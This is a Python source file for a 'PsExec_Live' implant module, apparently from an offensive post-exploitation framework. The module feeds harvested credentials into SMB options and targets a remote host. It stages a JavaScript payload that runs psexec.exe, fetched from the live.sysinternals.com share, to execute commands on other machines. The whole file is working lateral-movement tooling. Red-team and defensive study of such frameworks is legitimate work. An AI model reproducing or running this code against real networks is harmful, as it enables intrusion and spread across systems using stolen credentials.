import core.job
import core.implant
import uuid
import os.path


class PsExecLiveJob(core.job.Job):
    def create(self):
        cred_id = self.options.get("CREDID")
        if cred_id:
            key = self.shell.creds_keys[int(cred_id)]
            smbuser = self.shell.creds[key]["Username"]
            smbpass = self.shell.creds[key]["Password"]
            smbdomain = self.shell.creds[key]["Domain"]
            self.options.set("SMBUSER", smbuser)
            if not smbuser:
                self.shell.print_warning("Cred has no Username!")
            self.options.set("SMBPASS", smbpass)
            if not smbpass:
                self.shell.print_warning("Cred has no Password!")
            self.options.set("SMBDOMAIN", smbdomain)
            if not smbdomain:
                self.shell.print_warning("Cred has no Domain!")
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain("Result for `%s`:" % self.options.get('CMD'))
        #self.shell.print_plain(self.data)

class PsExecLiveImplant(core.implant.Implant):

    NAME = "PsExec_Live"
    DESCRIPTION = "Executes a command on another system, utilizing live.sysinternals.com publicly hosted tools."
    AUTHORS = ["RiskSense, Inc."]
    STATE = "implant/pivot/exec_psexec"

    def load(self):
        self.options.register("CMD", "hostname", "command to run")
        self.options.register("RHOST", "", "name/IP of the remote")
        self.options.register("SMBUSER", "", "username for login")
        self.options.register("SMBPASS", "", "password for login")
        self.options.register("SMBDOMAIN", ".", "domain for login")
        self.options.register("CREDID", "", "cred id from creds")
        #self.options.register("PAYLOAD", "", "payload to stage")
        self.options.register("RPATH", "\\\\\\\\live.sysinternals.com@SSL\\\\tools\\\\", "path to psexec.exe")
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
        # self.options.register("FILE", "", "random uuid for file name", hidden=True)

    def job(self):
        return PsExecLiveJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/pivot/exec_psexec.js"
        self.dispatch(payloads, self.job)
